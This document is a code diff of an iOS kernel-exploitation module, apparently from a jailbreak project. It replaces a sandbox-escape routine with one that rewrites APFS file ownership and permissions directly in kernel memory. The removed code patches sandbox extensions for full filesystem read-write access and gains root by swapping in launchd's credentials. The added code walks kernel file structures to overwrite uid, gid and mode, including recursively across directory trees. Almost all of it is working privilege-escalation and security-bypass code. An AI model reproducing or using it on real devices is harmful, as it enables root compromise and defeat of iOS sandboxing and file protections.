@@ -1,288 +1,343 @@
 /*
- * sandbox_escape.m — Sandbox escape via kernel memory patching
+ * apfs_own.m — 1:1 port of lara/kexploit/pe/apfs.m
  *
- * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
- * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
- * Fill all 16 hash slots → full R+W filesystem access
- * Based on 18.3_sandbox/root.m by CrazyMind90.
+ * Walk: fd -> self_proc->p_fd->fd_ofiles[fd] -> fileproc->fp_glob
+ *       -> fileglob->fg_data (vnode) -> v_data (apfs_fsnode)
+ * Then modify apfs_fsnode.uid / gid / mode directly in kernel memory.
+ *
+ * apfs_fsnode lives in a regular writable zone (not ZC_READONLY / PPL),
+ * so socket-based kR/W works on iOS 17.0 through 26.x — unlike the
+ * ucred/proc_ro writes which are blocked.
  */
 
 #import <Foundation/Foundation.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <errno.h>
 #include <sys/stat.h>
-#include "sandbox_escape.h"
-#include "kexploit/kexploit_opa334.h"
-#include "kexploit/krw.h"
+#include <stddef.h>
+#include <dirent.h>
+#include <string.h>
+#include <limits.h>
+
+#include "apfs_own.h"
 #include "kexploit/kutils.h"
+#include "kexploit/krw.h"
 #include "kexploit/offsets.h"
+#include "kexploit/xpaci.h"
+#include "kexploit/vnode.h"
 
-extern void early_kread(uint64_t where, void *read_buf, size_t size);
+// Verbatim from lara/kexploit/pe/apfs.m. We only touch uid/gid/mode, but
+// keeping the full layout so offsetof() stays correct if lara updates it.
+struct apfs_fsnode {
+    uint8_t             type;
+    uint8_t             _type_pad[7];
+    uint64_t            ino;
 
-#define KRW_LEN 0x20
+    union {
+        uint64_t        jhash_prev;
+        struct {
+            uint32_t    _jhash_prev_lo;
+            uint16_t    xattr_count;
+            uint16_t    xattr_flags;
+        };
+    };
 
-// Verified offsets (IDA binary analysis across 6 kernelcaches)
-#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
-#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
-#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
-#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
-#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
-#define OFF_EXT_DATA           0x40  // ext → data_addr
-#define OFF_EXT_DATALEN        0x48  // ext → data_len
+    uint64_t            jhash_next;
 
-// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
-// Derived from OFF_UCRED_CR_LABEL=0x78 and sizeof(posix_cred)=0x60.
-#define OFF_UCRED_CR_POSIX     0x18
-#define OFF_POSIX_CR_UID       0x00
-#define OFF_POSIX_CR_RUID      0x04
-#define OFF_POSIX_CR_SVUID     0x08
-#define OFF_POSIX_CR_NGROUPS   0x0C
-#define OFF_POSIX_CR_GROUPS_0  0x10  // first group (cr_groups[0])
-#define OFF_POSIX_CR_RGID      0x50
-#define OFF_POSIX_CR_SVGID     0x54
-#define OFF_POSIX_CR_GMUID     0x58
-#define OFF_POSIX_CR_FLAGS     0x5C
+    union {
+        uint64_t        parent_ino_or_owner_vnode;
+        struct {
+            uint32_t    parent_ino_lo;
+            uint16_t    parent_sub;
+            uint16_t    _parent_pad;
+        };
+    };
 
-#ifdef __arm64e__
-static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
-    asm(".long 0xDAC143E0");
-    asm("ret");
+    uint32_t            nstream_id;
+
+    union {
+        uint32_t        internal_flags;
+        struct {
+            uint8_t     reclaim_flag;
+            uint8_t     busy_flag;
+            uint16_t    internal_flags_hi;
+        };
+    };
+
+    void                *jhash_gate;
+
+    union {
+        uint64_t        internal_link;
+        struct {
+            uint8_t     _link_base;
+            uint8_t     snap_rename_flag;
+            uint16_t    _link_pad;
+            uint32_t    snap_mount_state;
+        };
+    };
+
+    uint64_t            graft_state;
+    uint64_t            snap_state;
+    uint64_t            fake_getattr_data;
+    uint64_t            mnomap_data;
+    uint64_t            cleanup_data;
+
+    union {
+        uint64_t        crypto_state;
+        struct {
+            uint8_t     _crypto_base;
+            uint8_t     crypto_class;
+            uint8_t     crypto_flags;
+            uint8_t     _crypto_pad;
+            uint32_t    crypto_extra;
+        };
+    };
+
+    uint32_t            bsd_flags;
+    uint32_t            gen_flags;
+    uint64_t            mmap_state;
+    uid_t               uid;
+    gid_t               gid;
+    uint16_t            mode;
+    uint16_t            open_refcnt;
+    uint32_t            ino_flags_ext;
+    uint64_t            raw_enc_data;
+};
+
+// Primary: open()-based. Needs read permission on the target, so it can
+// hit EACCES on root-owned 0600/0700 files that our sandbox escape doesn't
+// bypass (sandbox clears MAC, not DAC).
+static uint64_t getvnodefor_open(const char *path) {
+    int fd = open(path, O_RDONLY);
+    if (fd == -1) return (uint64_t)-1;
+
+    uint64_t self_proc = proc_self();
+    if (!self_proc) { close(fd); return (uint64_t)-1; }
+
+    uint64_t fileprocPtrArr = kread64(self_proc + off_proc_p_fd + off_filedesc_fd_ofiles);
+    fileprocPtrArr = xpaci(fileprocPtrArr);
+    if (!fileprocPtrArr) { close(fd); return (uint64_t)-1; }
+
+    uint64_t fileproc = kread64(fileprocPtrArr + (8 * fd));
+    if (!fileproc) { close(fd); return (uint64_t)-1; }
+
+    uint64_t fp_glob = kread64(fileproc + off_fileproc_fp_glob);
+    fp_glob = xpaci(fp_glob);
+    if (!fp_glob) { close(fd); return (uint64_t)-1; }
+
+    uint64_t vnode = kread64(fp_glob + off_fileglob_fg_data);
+    vnode = xpaci(vnode);
+
+    close(fd);
+    return vnode;
 }
-#else
-#define __xpaci_sbx(x) (x)
-#endif
 
-extern uint64_t VM_MIN_KERNEL_ADDRESS;
-extern uint64_t pac_mask;
+// Fallback for directories: chdir-based. Only needs x perm on parent chain,
+// not r perm on target. We reset cwd afterwards.
+static uint64_t getvnodefor_chdir(const char *path) {
+    char oldcwd[PATH_MAX];
+    if (!getcwd(oldcwd, sizeof(oldcwd))) oldcwd[0] = '\0';
+    if (chdir(path) != 0) return (uint64_t)-1;
 
-#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
-    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
-#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)
+    uint64_t self_proc = proc_self();
+    uint64_t vnode = kread64(self_proc + off_proc_p_fd + off_filedesc_fd_cdir);
+    vnode = xpaci(vnode);
 
-#pragma mark - Extension patching
+    if (oldcwd[0]) chdir(oldcwd);
+    else chdir("/");
+    return vnode;
+}
 
-static void patch_ext(uint64_t ext) {
-    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
-    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
-    if (K(da) && dl > 0) {
-        uint8_t buf[KRW_LEN];
-        early_kread(da, buf, KRW_LEN);
-        buf[0] = '/'; buf[1] = 0;
-        early_kwrite32bytes(da, buf);
+static uint64_t getvnodefor(const char *path) {
+    uint64_t v = getvnodefor_open(path);
+    if (v != (uint64_t)-1 && v != 0) return v;
+    // Fallback: chdir works for directories even when open() fails EACCES.
+    return getvnodefor_chdir(path);
+}
+
+extern BOOL g_exploit_finished;
+
+static uint64_t get_fsnode(const char *path) {
+    if (!g_exploit_finished) return 0;
+    uint64_t vnode = getvnodefor(path);
+    if (vnode == (uint64_t)-1 || !vnode) return 0;
+    uint64_t fs_node = kread64(vnode + off_vnode_v_data);
+    return fs_node;
+}
+
+uint32_t apfs_getuid_kr(const char *path) {
+    uint64_t fs_node = get_fsnode(path);
+    if (!fs_node) return 0;
+    return kread32(fs_node + offsetof(struct apfs_fsnode, uid));
+}
+
+uint32_t apfs_getgid_kr(const char *path) {
+    uint64_t fs_node = get_fsnode(path);
+    if (!fs_node) return 0;
+    return kread32(fs_node + offsetof(struct apfs_fsnode, gid));
+}
+
+uint16_t apfs_getmode_kr(const char *path) {
+    uint64_t fs_node = get_fsnode(path);
+    if (!fs_node) return 0;
+    return kread16(fs_node + offsetof(struct apfs_fsnode, mode));
+}
+
+int apfs_own(const char *path, uid_t uid, gid_t gid) {
+    uint64_t fs_node = get_fsnode(path);
+    if (!fs_node) {
+        NSLog(@"[APFS] own: unable to get fs_node: %s", path);
+        return -1;
     }
-    uint8_t chunk[KRW_LEN];
-    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
-    *(uint64_t*)(chunk + 0x08) = 1;
-    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
-    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
+
+    // Sanity check: kernel-read uid must match what stat() reports, or the
+    // struct layout is wrong and we'd corrupt an unrelated field.
+    struct stat st_before;
+    if (stat(path, &st_before) == 0) {
+        uint32_t kuid = kread32(fs_node + offsetof(struct apfs_fsnode, uid));
+        if (kuid != st_before.st_uid) {
+            NSLog(@"[APFS] own: layout mismatch for %s (stat uid=%u, kernel uid=%u); aborting",
+                  path, st_before.st_uid, kuid);
+            return -1;
+        }
+    }
+
+    kwrite32(fs_node + offsetof(struct apfs_fsnode, uid), uid);
+    kwrite32(fs_node + offsetof(struct apfs_fsnode, gid), gid);
+
+    sync(); sync(); sync();
+
+    struct stat st;
+    if (stat(path, &st) != 0) {
+        NSLog(@"[APFS] own: stat() failed after write: %s", path);
+        return -1;
+    }
+    if (st.st_uid != uid || st.st_gid != gid) {
+        NSLog(@"[APFS] own: verify failed (got uid=%u gid=%u, expected %u/%u): %s",
+              st.st_uid, st.st_gid, uid, gid, path);
+        return -1;
+    }
+
+    NSLog(@"[APFS] own: %s -> uid=%u gid=%u", path, uid, gid);
+    return 0;
 }
 
-static int patch_chain(uint64_t hdr) {
-    int n = 0;
-    for (int i = 0; i < 64 && K(hdr); i++) {
-        uint64_t ext = S(early_kread64(hdr + 0x8));
-        if (K(ext)) { patch_ext(ext); n++; }
-        uint64_t next = early_kread64(hdr);
-        if (!next || !K(next)) break;
-        hdr = S(next);
+// Fast path: skip per-entry sync/stat verify. Used by the bulk tree walker.
+// Returns 0 on success (readback matched), -1 on failure.
+static int apfs_own_unsafe(const char *path, uid_t uid, gid_t gid,
+                           uint32_t *out_before_uid) {
+    uint64_t fs_node = get_fsnode(path);
+    if (!fs_node) return -1;
+
+    uint32_t before = kread32(fs_node + offsetof(struct apfs_fsnode, uid));
+    if (out_before_uid) *out_before_uid = before;
+
+    kwrite32(fs_node + offsetof(struct apfs_fsnode, uid), uid);
+    kwrite32(fs_node + offsetof(struct apfs_fsnode, gid), gid);
+
+    // Kernel-side read-back: if the write didn't take, we haven't changed
+    // anything and the caller should count this as a failure.
+    uint32_t after = kread32(fs_node + offsetof(struct apfs_fsnode, uid));
+    if (after != uid) return -1;
+    return 0;
+}
+
+// Skip subtrees iOS validates by ownership — chown'ing these breaks codesign
+// or FairPlay DRM and can brick the app.
+static int is_skip_name(const char *name) {
+    return strcmp(name, "_CodeSignature") == 0 ||
+           strcmp(name, "SC_Info") == 0;
+}
+
+static long chown_walk(const char *path, uid_t uid, gid_t gid, int depth,
+                       long *skipped_lstat, long *skipped_chown, long *skipped_opendir) {
+    if (depth > 32) return 0;
+
+    struct stat st;
+    if (lstat(path, &st) != 0) { (*skipped_lstat)++; return 0; }
+    if (S_ISLNK(st.st_mode)) return 0;
+
+    long n = 0;
+    uint32_t before_uid = (uint32_t)-1;
+    int rc = apfs_own_unsafe(path, uid, gid, &before_uid);
+    if (rc == 0) {
+        n++;
+        // Log first few successful chowns (non-no-op) to prove writes work.
+        if (before_uid != uid && n <= 5) {
+            NSLog(@"[APFS] chown'd: %s (uid %u -> %u)", path, before_uid, uid);
+        }
+    } else {
+        (*skipped_chown)++;
+        if (*skipped_chown <= 5) {
+            NSLog(@"[APFS] skipped chown: %s (before=%u errno=%d)",
+                  path, before_uid, errno);
+        }
+    }
+
+    if (S_ISDIR(st.st_mode)) {
+        DIR *d = opendir(path);
+        if (!d) {
+            (*skipped_opendir)++;
+            if (*skipped_opendir <= 5)
+                NSLog(@"[APFS] skipped opendir: %s (errno=%d)", path, errno);
+            return n;
+        }
+        struct dirent *e;
+        while ((e = readdir(d)) != NULL) {
+            if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
+            if (is_skip_name(e->d_name)) continue;
+            char child[PATH_MAX];
+            int len = snprintf(child, sizeof(child), "%s/%s", path, e->d_name);
+            if (len <= 0 || len >= (int)sizeof(child)) continue;
+            n += chown_walk(child, uid, gid, depth + 1,
+                            skipped_lstat, skipped_chown, skipped_opendir);
+        }
+        closedir(d);
     }
     return n;
 }
 
-static void set_rw_class(uint64_t hdr) {
-    uint64_t ext = S(early_kread64(hdr + 0x8));
-    if (!K(ext)) return;
-    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
-    if (!K(da)) return;
-
-    const char *rw = "com.apple.app-sandbox.read-write";
-    uint8_t b1[KRW_LEN], b2[KRW_LEN];
-    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
-    memcpy(b1, rw, KRW_LEN);
-    early_kwrite32bytes(da + 32, b1);
-    early_kwrite32bytes(da + 64, b2);
-
-    uint8_t hb[KRW_LEN];
-    early_kread(hdr, hb, KRW_LEN);
-    *(uint64_t*)(hb + 0x10) = da + 32;
-    early_kwrite32bytes(hdr, hb);
+long apfs_own_tree(const char *root, uid_t uid, gid_t gid) {
+    NSLog(@"[APFS] own_tree: walking %s -> uid=%u gid=%u", root, uid, gid);
+    long skipped_lstat = 0, skipped_chown = 0, skipped_opendir = 0;
+    long n = chown_walk(root, uid, gid, 0,
+                        &skipped_lstat, &skipped_chown, &skipped_opendir);
+    sync(); sync(); sync();
+    NSLog(@"[APFS] own_tree: chown'd %ld entries under %s "
+          "(skipped: lstat=%ld chown=%ld opendir=%ld)",
+          n, root, skipped_lstat, skipped_chown, skipped_opendir);
+    return n;
 }
 
-#pragma mark - Main entry
-
-int sandbox_escape(uint64_t self_proc) {
-    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }
-
-    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
-    uint64_t proc_ro = S(proc_ro_raw);
-    NSLog(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
-    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }
-
-    // Scan proc_ro for ucred — offset varies by iOS build.
-    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
-    NSLog(@"[SBX] Scanning proc_ro for ucred...");
-    uint64_t ucred = 0;
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t raw = early_kread64(proc_ro + off);
-        uint64_t smr = kread_smrptr(proc_ro + off);
-        uint64_t pac = S(raw);
-        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
-
-        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
-        if (K(smr)) {
-            uint64_t maybe_label = S(early_kread64(smr + 0x78));
-            if (K(maybe_label)) {
-                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
-                    ucred = smr;
-                    break;
-                }
-            }
-        }
-        // Also try PAC-stripped
-        if (!ucred && K(pac)) {
-            uint64_t maybe_label = S(early_kread64(pac + 0x78));
-            if (K(maybe_label)) {
-                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
-                    ucred = pac;
-                    break;
-                }
-            }
-        }
-    }
-    if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }
-
-    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }
-
-    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }
-
-    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }
-
-    NSLog(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
-          proc_ro, ucred, label, sandbox, ext_set);
-
-    int patched = 0;
-    for (int s = 0; s < 16; s++) {
-        uint64_t hdr = S(early_kread64(ext_set + s * 8));
-        if (K(hdr)) patched += patch_chain(hdr);
-    }
-    NSLog(@"[SBX] Patched %d extensions", patched);
-
-    int classed = 0;
-    for (int s = 0; s < 16; s++) {
-        uint64_t hdr = S(early_kread64(ext_set + s * 8));
-        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
-    }
-    NSLog(@"[SBX] Changed %d extension classes", classed);
-
-    uint64_t src = 0;
-    for (int s = 0; s < 16 && !src; s++) {
-        uint64_t h = S(early_kread64(ext_set + s * 8));
-        if (K(h)) src = h;
-    }
-    if (src) {
-        int filled = 0;
-        for (int s = 0; s < 16; s++) {
-            uint64_t h = early_kread64(ext_set + s * 8);
-            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
-        }
-        NSLog(@"[SBX] Filled %d empty hash slots", filled);
-    }
-
-    int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }
-
-    if (fd_w >= 0) {
-        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
-        return 0;
-    }
-
-    NSLog(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
-    return -1;
-}
-
-#pragma mark - UID elevation (uid=0 via launchd ucred swap)
-
-// Scan proc_ro in [0x10..0x40] for a valid ucred pointer.
-// A valid ucred has cr_label at +0x78 pointing to a kernel addr
-static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
-    if (!proc) return -1;
-    uint64_t proc_ro = S(early_kread64(proc + OFF_PROC_PROC_RO));
-    if (!K(proc_ro)) return -1;
-
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t raw = early_kread64(proc_ro + off);
-        uint64_t smr = kread_smrptr(proc_ro + off);
-        uint64_t pac = S(raw);
-        uint64_t cands[2] = { smr, pac };
-        for (int i = 0; i < 2; i++) {
-            uint64_t c = cands[i];
-            if (!K(c)) continue;
-            uint64_t lbl = S(early_kread64(c + OFF_UCRED_CR_LABEL));
-            if (!K(lbl)) continue;
-            uint64_t sbx = S(early_kread64(lbl + OFF_LABEL_SANDBOX));
-            if (K(sbx)) {
-                *ucred_out = c;
-                *off_out = off;
-                return 0;
-            }
-        }
-    }
-    return -1;
-}
-
-static uint64_t sbx_ucredbyproc(uint64_t proc) {
-    uint64_t ucred = 0;
-    uint32_t off = 0;
-    if (sbx_find_ucred_slot(proc, &ucred, &off) != 0) return 0;
-    return ucred;
-}
-
-int sandbox_elevate_to_root(uint64_t self_proc) {
-    uint64_t launchd = proc_find_by_name("launchd");
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
-        launchd = proc_find(1);
-        if (launchd && launchd != (uint64_t)-1) {
-            NSLog(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
-        }
-    }
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: could not find launchd");
+int apfs_mod(const char *path, mode_t mode) {
+    uint64_t fs_node = get_fsnode(path);
+    if (!fs_node) {
+        NSLog(@"[APFS] mod: unable to get fs_node: %s", path);
         return -1;
     }
 
-    uint64_t launchducred = sbx_ucredbyproc(launchd);
-    if (!launchducred) {
-        NSLog(@"[SBX] elevate: failed to get valid ucred from launchd");
+    struct stat st_before;
+    if (stat(path, &st_before) == 0) {
+        uint16_t kmode = kread16(fs_node + offsetof(struct apfs_fsnode, mode));
+        if (kmode != (st_before.st_mode & 0xFFFF)) {
+            NSLog(@"[APFS] mod: layout mismatch for %s (stat mode=0%o, kernel=0%o); aborting",
+                  path, st_before.st_mode & 0xFFFF, kmode);
+            return -1;
+        }
+    }
+
+    kwrite16(fs_node + offsetof(struct apfs_fsnode, mode), (uint16_t)mode);
+
+    sync(); sync(); sync();
+
+    struct stat st;
+    if (stat(path, &st) != 0) return -1;
+    if ((st.st_mode & 0xFFFF) != (mode & 0xFFFF)) {
+        NSLog(@"[APFS] mod: verify failed (got 0%o, expected 0%o): %s",
+              st.st_mode & 0xFFFF, mode, path);
         return -1;
     }
-    NSLog(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
 
-    if (!self_proc) {
-        NSLog(@"[SBX] elevate: failed to get our proc");
-        return -1;
-    }
-    NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
-
-    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
-    uint64_t ourucred = S(ourucredraw);
-    NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
-
-    early_kwrite64(self_proc + 0x10, launchducred);
-
-    if (getuid() == 0) {
-        NSLog(@"[SBX] elevate success!");
-        return 0;
-    }
-
-    NSLog(@"[SBX] elevate failed, uid: %d", getuid());
-    return -1;
+    NSLog(@"[APFS] mod: %s -> 0%o", path, mode);
+    return 0;
 }
